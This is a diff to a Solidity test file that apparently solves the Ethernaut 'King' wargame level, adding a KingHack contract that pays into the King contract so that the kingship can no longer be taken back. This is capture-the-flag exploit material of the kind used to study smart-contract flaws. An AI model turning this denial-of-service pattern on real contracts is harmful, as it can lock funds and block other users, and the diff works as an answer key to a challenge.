@@ -29,7 +29,8 @@ contract KingTest is Test {
         /****************
          *    Attack     *
          *************** */
-
+        KingHack kingHack = new KingHack(levelAddress);
+        kingHack.hack{value: 1.001 ether}();
         /*****************
          *Level Submission*
          ***************  */
@@ -38,5 +39,22 @@ contract KingTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract KingHack {
+    King public challenge;
+
+    // -- 1 --
+    constructor(address challengeAddress) {
+        challenge = King(payable(challengeAddress));
+    }
+
+    function hack() external payable {
+        // -- 2 --
+        (bool success, ) = payable(address(challenge)).call{
+            value: msg.value
+        }("");
+        require(success);
     }
 }
